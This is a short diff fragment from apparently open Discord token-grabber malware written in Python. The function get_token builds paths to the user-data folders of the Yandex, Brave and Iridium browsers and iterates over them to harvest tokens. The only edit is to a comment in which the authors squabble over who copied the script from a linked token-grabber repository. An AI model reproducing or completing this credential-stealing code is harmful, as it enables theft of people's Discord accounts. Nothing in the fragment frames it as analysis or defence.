@@ -83,7 +83,7 @@ def get_token():
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Iridium': local + '\\Iridium\\User Data\\Default'
-    }  # "CRACKED FINAL VERSION!" - CALLOC RYLIX SKIDDIED THIS SCRIPT IN SEE: https://github.com/AstraaDev/Discord-Token-Grabber-V2/blob/main/token_grabber.py
+    }  # "CRACKED FINAL VERSION! RYLIX SKIDDIED THIS SCRIPT IN SEE: https://github.com/AstraaDev/Discord-Token-Grabber-V2/blob/main/token_grabber.py" - CALLOC 
     for platform, path in paths.items():
         if not os.path.exists(path): continue
         try:
